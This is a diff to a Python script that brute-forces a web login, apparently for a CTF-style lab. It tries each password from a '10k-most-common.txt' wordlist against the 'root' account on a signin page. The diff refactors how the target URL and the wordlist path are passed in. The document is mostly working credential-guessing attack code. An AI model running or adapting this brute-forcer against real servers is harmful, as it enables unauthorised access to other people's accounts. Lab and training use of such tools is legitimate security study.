@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 
+import os
 import glob
 import argparse
 import requests
 
-URL = None
+URL = os.environ.get('URL')
+PASSWORDS = glob.glob("./**/" + "10k-most-common.txt", recursive=True)[0]
 PARAMS = {"page": "signin", "Login": "Login", "username": "root"}
 
 
@@ -16,12 +18,8 @@ def check(password):
     return False
 
 
-def find_file_path_from_current_dir():
-    return glob.glob("./**/" + "10k-most-common.txt", recursive=True)[0]
-
-
 def main():
-    with open(find_file_path_from_current_dir(), "r") as file:
+    with open(PASSWORDS, "r") as file:
         while True:
             password = file.readline()
             if password:
@@ -35,8 +33,9 @@ def main():
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Find the right password")
-    parser.add_argument("URL", help="URL address of the server")
-    args = parser.parse_args()
-    URL = args.URL
+    if not URL:
+        parser = argparse.ArgumentParser(description="Find the right password")
+        parser.add_argument("URL", help="URL address of the server")
+        args = parser.parse_args()
+        URL = args.URL
     main()
